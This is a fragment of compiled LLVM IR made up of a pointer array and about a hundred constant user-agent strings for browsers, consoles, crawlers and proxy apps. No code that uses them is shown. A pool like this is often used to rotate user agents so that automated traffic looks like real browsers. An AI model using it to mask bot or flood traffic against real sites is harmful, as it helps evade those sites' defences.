0, i32 0), i8* getelementptr inbounds ([77 x i8], [77 x i8]* @.str.245, i32 0, i32 0), i8* getelementptr inbounds ([56 x i8], [56 x i8]* @.str.246, i32 0, i32 0), i8* getelementptr inbounds ([118 x i8], [118 x i8]* @.str.247, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.248, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.116, i32 0, i32 0), i8* getelementptr inbounds ([107 x i8], [107 x i8]* @.str.117, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @.str.118, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.119, i32 0, i32 0), i8* getelementptr inbounds ([116 x i8], [116 x i8]* @.str.120, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @.str.121, i32 0, i32 0), i8* getelementptr inbounds ([150 x i8], [150 x i8]* @.str.122, i32 0, i32 0), i8* getelementptr inbounds ([76 x i8], [76 x i8]* @.str.123, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.124, i32 0, i32 0), i8* getelementptr inbounds ([58 x i8], [58 x i8]* @.str.125, i32 0, i32 0), i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.249, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.250, i32 0, i32 0), i8* getelementptr inbounds ([170 x i8], [170 x i8]* @.str.265, i32 0, i32 0), i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.252, i32 0, i32 0), i8* getelementptr inbounds ([58 x i8], [58 x i8]* @.str.253, i32 0, i32 0), i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.254, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.255, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.256, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.257, i32 0, i32 0), i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.258, i32 0, i32 0), i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.259, i32 0, i32 0), i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.260, i32 0, i32 0), i8* getelementptr inbounds ([104 x i8], [104 x i8]* @.str.261, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.262, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.263, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.266, i32 0, i32 0), i8* getelementptr inbounds ([195 x i8], [195 x i8]* @.str.267, i32 0, i32 0), i8* getelementptr inbounds ([107 x i8], [107 x i8]* @.str.238, i32 0, i32 0), i8* getelementptr inbounds ([154 x i8], [154 x i8]* @.str.268, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([112 x i8], [112 x i8]* @.str.269, i32 0, i32 0), i8* getelementptr inbounds ([92 x i8], [92 x i8]* @.str.270, i32 0, i32 0), i8* getelementptr inbounds ([81 x i8], [81 x i8]* @.str.271, i32 0, i32 0), i8* getelementptr inbounds ([117 x i8], [117 x i8]* @.str.272, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.273, i32 0, i32 0), i8* getelementptr inbounds ([97 x i8], [97 x i8]* @.str.274, i32 0, i32 0), i8* getelementptr inbounds ([95 x i8], [95 x i8]* @.str.275, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.276, i32 0, i32 0), i8* getelementptr inbounds ([66 x i8], [66 x i8]* @.str.277, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.211, i32 0, i32 0), i8* getelementptr inbounds ([77 x i8], [77 x i8]* @.str.278, i32 0, i32 0), i8* getelementptr inbounds ([131 x i8], [131 x i8]* @.str.279, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.280, i32 0, i32 0), i8* getelementptr inbounds ([76 x i8], [76 x i8]* @.str.227, i32 0, i32 0), i8* getelementptr inbounds ([107 x i8], [107 x i8]* @.str.238, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @.str.281, i32 0, i32 0), i8* getelementptr inbounds ([150 x i8], [150 x i8]* @.str.282, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.248, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.283, i32 0, i32 0), i8* getelementptr inbounds ([126 x i8], [126 x i8]* @.str.284, i32 0, i32 0), i8* getelementptr inbounds ([126 x i8], [126 x i8]* @.str.285, i32 0, i32 0), i8* getelementptr inbounds ([125 x i8], [125 x i8]* @.str.286, i32 0, i32 0), i8* getelementptr inbounds ([125 x i8], [125 x i8]* @.str.287, i32 0, i32 0), i8* getelementptr inbounds ([126 x i8], [126 x i8]* @.str.288, i32 0, i32 0), i8* getelementptr inbounds ([126 x i8], [126 x i8]* @.str.289, i32 0, i32 0), i8* getelementptr inbounds ([119 x i8], [119 x i8]* @.str.290, i32 0, i32 0), i8* getelementptr inbounds ([107 x i8], [107 x i8]* @.str.291, i32 0, i32 0), i8* getelementptr inbounds ([116 x i8], [116 x i8]* @.str.292, i32 0, i32 0), i8* getelementptr inbounds ([127 x i8], [127 x i8]* @.str.293, i32 0, i32 0), i8* getelementptr inbounds ([59 x i8], [59 x i8]* @.str.294, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.39, i32 0, i32 0), i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.295, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.296, i32 0, i32 0), i8* getelementptr inbounds ([118 x i8], [118 x i8]* @.str.222, i32 0, i32 0), i8* getelementptr inbounds ([208 x i8], [208 x i8]* @.str.297, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.298, i32 0, i32 0), i8* getelementptr inbounds ([118 x i8], [118 x i8]* @.str.206, i32 0, i32 0), i8* getelementptr inbounds ([106 x i8], [106 x i8]* @.str.299, i32 0, i32 0), i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.214, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.266, i32 0, i32 0), i8* getelementptr inbounds ([195 x i8], [195 x i8]* @.str.267, i32 0, i32 0), i8* getelementptr inbounds ([107 x i8], [107 x i8]* @.str.238, i32 0, i32 0), i8* getelementptr inbounds ([154 x i8], [154 x i8]* @.str.268, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([112 x i8], [112 x i8]* @.str.269, i32 0, i32 0), i8* getelementptr inbounds ([92 x i8], [92 x i8]* @.str.270, i32 0, i32 0), i8* getelementptr inbounds ([81 x i8], [81 x i8]* @.str.271, i32 0, i32 0), i8* getelementptr inbounds ([117 x i8], [117 x i8]* @.str.272, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.273, i32 0, i32 0), i8* getelementptr inbounds ([97 x i8], [97 x i8]* @.str.274, i32 0, i32 0), i8* getelementptr inbounds ([95 x i8], [95 x i8]* @.str.275, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.276, i32 0, i32 0), i8* getelementptr inbounds ([66 x i8], [66 x i8]* @.str.277, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.211, i32 0, i32 0), i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.300, i32 0, i32 0), i8* getelementptr inbounds ([77 x i8], [77 x i8]* @.str.278, i32 0, i32 0), i8* getelementptr inbounds ([134 x i8], [134 x i8]* @.str.301, i32 0, i32 0), i8* getelementptr inbounds ([131 x i8], [131 x i8]* @.str.279, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.280, i32 0, i32 0), i8* getelementptr inbounds ([76 x i8], [76 x i8]* @.str.227, i32 0, i32 0), i8* getelementptr inbounds ([107 x i8], [107 x i8]* @.str.238, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @.str.281, i32 0, i32 0), i8* getelementptr inbounds ([150 x i8], [150 x i8]* @.str.282, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.248, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.283, i32 0, i32 0), i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.302, i32 0, i32 0), i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.303, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.304, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.305, i32 0, i32 0), i8* getelementptr inbounds ([112 x i8], [112 x i8]* @.str.306, i32 0, i32 0), i8* getelementptr inbounds ([126 x i8], [126 x i8]* @.str.284, i32 0, i32 0), i8* getelementptr inbounds ([126 x i8], [126 x i8]* @.str.285, i32 0, i32 0), i8* getelementptr inbounds ([125 x i8], [125 x i8]* @.str.286, i32 0, i32 0), i8* getelementptr inbounds ([125 x i8], [125 x i8]* @.str.287, i32 0, i32 0), i8* getelementptr inbounds ([126 x i8], [126 x i8]* @.str.288, i32 0, i32 0), i8* getelementptr inbounds ([126 x i8], [126 x i8]* @.str.289, i32 0, i32 0), i8* getelementptr inbounds ([119 x i8], [119 x i8]* @.str.290, i32 0, i32 0), i8* getelementptr inbounds ([107 x i8], [107 x i8]* @.str.291, i32 0, i32 0), i8* getelementptr inbounds ([116 x i8], [116 x i8]* @.str.292, i32 0, i32 0), i8* getelementptr inbounds ([127 x i8], [127 x i8]* @.str.293, i32 0, i32 0), i8* getelementptr inbounds ([59 x i8], [59 x i8]* @.str.294, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.39, i32 0, i32 0), i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.295, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.296, i32 0, i32 0), i8* getelementptr inbounds ([118 x i8], [118 x i8]* @.str.222, i32 0, i32 0), i8* getelementptr inbounds ([208 x i8], [208 x i8]* @.str.297, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.298, i32 0, i32 0), i8* getelementptr inbounds ([118 x i8], [118 x i8]* @.str.206, i32 0, i32 0), i8* getelementptr inbounds ([106 x i8], [106 x i8]* @.str.299, i32 0, i32 0), i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.214, i32 0, i32 0)], align 16
@.str = private unnamed_addr constant [64 x i8] c"Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)\00", align 1
@.str.1 = private unnamed_addr constant [65 x i8] c"Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)\00", align 1
@.str.2 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00\00", align 1
@.str.3 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00\00", align 1
@.str.4 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00\00", align 1
@.str.5 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; de) Opera 11.01\00", align 1
@.str.6 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00\00", align 1
@.str.7 = private unnamed_addr constant [110 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36\00", align 1
@.str.8 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36\00", align 1
@.str.9 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0\00", align 1
@.str.10 = private unnamed_addr constant [135 x i8] c"Mozilla/5.0 (iPhone; CPU iPhone OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4\00", align 1
@.str.11 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0\00", align 1
@.str.12 = private unnamed_addr constant [110 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36\00", align 1
@.str.13 = private unnamed_addr constant [109 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36\00", align 1
@.str.14 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11) AppleWebKit/601.1.56 (KHTML, like Gecko) Version/9.0 Safari/601.1.56\00", align 1
@.str.15 = private unnamed_addr constant [117 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/601.2.7 (KHTML, like Gecko) Version/9.0.1 Safari/601.2.7\00", align 1
@.str.16 = private unnamed_addr constant [69 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko\00", align 1
@.str.17 = private unnamed_addr constant [47 x i8] c"Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)\00", align 1
@.str.18 = private unnamed_addr constant [63 x i8] c"Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51\00", align 1
@.str.19 = private unnamed_addr constant [73 x i8] c"Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16\00", align 1
@.str.20 = private unnamed_addr constant [120 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A\00", align 1
@.str.21 = private unnamed_addr constant [111 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36\00", align 1
@.str.22 = private unnamed_addr constant [109 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Safari/537.36\00", align 1
@.str.23 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Linux; Android 4.4.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile Safari/537.36\00", align 1
@.str.24 = private unnamed_addr constant [147 x i8] c"Mozilla/5.0 (Linux; Android 4.4.3; HTC_0PCV2 Build/KTU84L) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36\00", align 1
@.str.25 = private unnamed_addr constant [70 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; X11; Linux x86_64; pl) Opera 11.00\00", align 1
@.str.26 = private unnamed_addr constant [70 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows 98; .NET CLR 3.0.04506.30)\00", align 1
@.str.27 = private unnamed_addr constant [64 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)\00", align 1
@.str.28 = private unnamed_addr constant [123 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/4.0; GTB7.4; InfoPath.3; SV1; .NET CLR 3.4.53360; WOW64; en-US)\00", align 1
@.str.29 = private unnamed_addr constant [103 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; FDM; MSIECrawler; Media Center PC 5.0)\00", align 1
@.str.30 = private unnamed_addr constant [123 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 4.4.58799; WOW64; en-US)\00", align 1
@.str.31 = private unnamed_addr constant [80 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts)\00", align 1
@.str.32 = private unnamed_addr constant [82 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0\00", align 1
@.str.33 = private unnamed_addr constant [82 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:21.0) Gecko/20100101 Firefox/21.0\00", align 1
@.str.34 = private unnamed_addr constant [82 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:24.0) Gecko/20100101 Firefox/24.0\00", align 1
@.str.35 = private unnamed_addr constant [83 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0\00", align 1
@.str.36 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36\00", align 1
@.str.37 = private unnamed_addr constant [101 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36\00", align 1
@.str.38 = private unnamed_addr constant [66 x i8] c"Opera/9.80 (Windows NT 6.2; Win64; x64) Presto/2.12 Version/12.16\00", align 1
@.str.39 = private unnamed_addr constant [64 x i8] c"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)\00", align 1
@.str.40 = private unnamed_addr constant [71 x i8] c"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)\00", align 1
@.str.41 = private unnamed_addr constant [62 x i8] c"Mozilla/5.0 (compatible; Konqueror/3.0; i686 Linux; 20021117)\00", align 1
@.str.42 = private unnamed_addr constant [64 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5\00", align 1
@.str.43 = private unnamed_addr constant [144 x i8] c"Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10\00", align 1
@.str.44 = private unnamed_addr constant [55 x i8] c"Mozilla/5.0 Galeon/1.0.3 (X11; Linux i686; U;) Gecko/0\00", align 1
@.str.45 = private unnamed_addr constant [32 x i8] c"Opera/6.04 (Windows XP; U) [en]\00", align 1
@.str.46 = private unnamed_addr constant [24 x i8] c"Opera/9.99 (X11; U; sk)\00", align 1
@.str.47 = private unnamed_addr constant [86 x i8] c"Mozilla/6.0 (Future Star Technologies Corp. Star-Blade OS; U; en-US) iNet Browser 2.5\00", align 1
@.str.48 = private unnamed_addr constant [157 x i8] c"Mozilla/5.0(iPad; U; CPU iPhone OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B314 Safari/531.21.10gin_lib.cc\00", align 1
@.str.49 = private unnamed_addr constant [82 x i8] c"Mozilla/5.0 Galeon/1.2.9 (X11; Linux i686; U;) Gecko/20021213 Debian/1.2.9-0.bunk\00", align 1
@.str.50 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41\00", align 1
@.str.51 = private unnamed_addr constant [63 x i8] c"Mozilla/5.0 (compatible; iCab 3.0.3; Macintosh; U; PPC Mac OS)\00", align 1
@.str.52 = private unnamed_addr constant [182 x i8] c"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0\00", align 1
@.str.53 = private unnamed_addr constant [83 x i8] c"Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.9a8) Gecko/2007100620 GranParadiso/3.1\00", align 1
@.str.54 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)\00", align 1
@.str.55 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4\00", align 1
@.str.56 = private unnamed_addr constant [64 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201\00", align 1
@.str.57 = private unnamed_addr constant [69 x i8] c"Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911\00", align 1
@.str.58 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2\00", align 1
@.str.59 = private unnamed_addr constant [106 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)\00", align 1
@.str.60 = private unnamed_addr constant [87 x i8] c"Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285\00", align 1
@.str.61 = private unnamed_addr constant [80 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7\00", align 1
@.str.62 = private unnamed_addr constant [34 x i8] c"Mozilla/5.0 (PLAYSTATION 3; 3.55)\00", align 1
@.str.63 = private unnamed_addr constant [91 x i8] c"Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Thunderbird/38.2.0 Lightning/4.0.2\00", align 1
@.str.64 = private unnamed_addr constant [15 x i8] c"wii libnup/1.0\00", align 1
@.str.65 = private unnamed_addr constant [47 x i8] c"Mozilla/4.0 (PSP (PlayStation Portable); 2.00)\00", align 1
@.str.66 = private unnamed_addr constant [33 x i8] c"PSP (PlayStation Portable); 2.00\00", align 1
@.str.67 = private unnamed_addr constant [34 x i8] c"Bunjalloo/0.7.6(Nintendo DS;U;en)\00", align 1
@.str.68 = private unnamed_addr constant [26 x i8] c"Doris/1.15 [en] (Symbian)\00", align 1
@.str.69 = private unnamed_addr constant [61 x i8] c"BlackBerry7520/4.0.0 Profile/MIDP-2.0 Configuration/CLDC-1.1\00", align 1
@.str.70 = private unnamed_addr constant [140 x i8] c"BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100findlinks/2.0.1 (+http://wortschatz.uni-leipzig.de/findlinks/)\00", align 1
@.str.71 = private unnamed_addr constant [69 x i8] c"findlinks/1.1.6-beta6 (+http://wortschatz.uni-leipzig.de/findlinks/)\00", align 1
@.str.72 = private unnamed_addr constant [69 x i8] c"findlinks/1.1.6-beta4 (+http://wortschatz.uni-leipzig.de/findlinks/)\00", align 1
@.str.73 = private unnamed_addr constant [69 x i8] c"findlinks/1.1.6-beta1 (+http://wortschatz.uni-leipzig.de/findlinks/)\00", align 1
@.str.74 = private unnamed_addr constant [69 x i8] c"findlinks/1.1.5-beta7 (+http://wortschatz.uni-leipzig.de/findlinks/)\00", align 1
@.str.75 = private unnamed_addr constant [81 x i8] c"Mozilla/5.0 (Windows; U; WinNT; en; rv:1.0.2) Gecko/20030311 Beonex/0.8.2-stable\00", align 1
@.str.76 = private unnamed_addr constant [78 x i8] c"Mozilla/5.0 (Windows; U; WinNT; en; Preview) Gecko/20020603 Beonex/0.8-stable\00", align 1
@.str.77 = private unnamed_addr constant [105 x i8] c"Mozilla/5.0 (X11; U; Linux i686; nl; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2 (Debian-1.99+2.0b2+dfsg-1)\00", align 1
@.str.78 = private unnamed_addr constant [81 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2\00", align 1
@.str.79 = private unnamed_addr constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1b2) Gecko/20060826 BonEcho/2.0b2\00", align 1
@.str.80 = private unnamed_addr constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.8.1b2) Gecko/20060831 BonEcho/2.0b2\00", align 1
@.str.81 = private unnamed_addr constant [97 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-GB; rv:1.8.1b1) Gecko/20060601 BonEcho/2.0b1 (Ubuntu-edgy)\00", align 1
@.str.82 = private unnamed_addr constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a3) Gecko/20060526 BonEcho/2.0a3\00", align 1
@.str.83 = private unnamed_addr constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2\00", align 1
@.str.84 = private unnamed_addr constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2\00", align 1
@.str.85 = private unnamed_addr constant [96 x i8] c"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2\00", align 1
@.str.86 = private unnamed_addr constant [71 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)\00", align 1
@.str.87 = private unnamed_addr constant [150 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: unblock4myspace)AppEngine-Google; (+http://code.google.com/appengine; appid: tunisproxy)\00", align 1
@.str.88 = private unnamed_addr constant [74 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-in-rs)\00", align 1
@.str.89 = private unnamed_addr constant [73 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-ba-k)\00", align 1
@.str.90 = private unnamed_addr constant [78 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: moelonepyaeshan)\00", align 1
@.str.91 = private unnamed_addr constant [71 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: mirrorrr)\00", align 1
@.str.92 = private unnamed_addr constant [84 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: mapremiereapplication)\00", align 1
@.str.93 = private unnamed_addr constant [79 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: longbows-hideout)\00", align 1
@.str.94 = private unnamed_addr constant [70 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: eduas23)\00", align 1
@.str.95 = private unnamed_addr constant [74 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: craigserver)\00", align 1
@.str.96 = private unnamed_addr constant [73 x i8] c"AppEngine-Google; ( http://code.google.com/appengine; appid: proxy-ba-k)\00", align 1
@.str.97 = private unnamed_addr constant [71 x i8] c"magpie-crawler/1.1 (U; Linux amd64; en-GB; +http://www.brandwatch.net)\00", align 1
@.str.98 = private unnamed_addr constant [80 x i8] c"Mozilla/5.0 (compatible; MJ12bot/v1.2.4; http://www.majestic12.co.uk/bot.php?+)\00", align 1
@.str.99 = private unnamed_addr constant [80 x i8] c"Mozilla/5.0 (compatible; MJ12bot/v1.2.3; http://www.majestic12.co.uk/bot.php?+)\00", align 1
@.str.100 = private unnamed_addr constant [51 x i8] c"MJ12bot/v1.0.8 (http://majestic12.co.uk/bot.php?+)\00", align 1
@.str.101 = private unnamed_addr constant [51 x i8] c"MJ12bot/v1.0.7 (http://majestic12.co.uk/bot.php?+)\00", align 1
@.str.102 = private unnamed_addr constant [72 x i8] c"Mozilla/5.0 (compatible; MojeekBot/2.0; http://www.mojeek.com/bot.html)\00", align 1
@.str.103 = private unnamed_addr constant [78 x i8] c"BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100\00", align 1
@.str.104 = private unnamed_addr constant [60 x i8] c"Opera/9.80 (Windows NT 5.1; U;) Presto/2.7.62 Version/11.01\00", align 1
@.str.105 = private unnamed_addr constant [92 x i8] c"Mozilla/5.0 (X11; Linux x86_64; U; de; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.62\00", align 1
@.str.106 = private unnamed_addr constant [119 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.39 Safari/525.19\00", align 1
@.str.107 = private unnamed_addr constant [89 x i8] c"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; chromeframe/11.0.696.57)\00", align 1
@.str.108 = private unnamed_addr constant [81 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; uZardWeb/1.0; Server_JP)\00", align 1
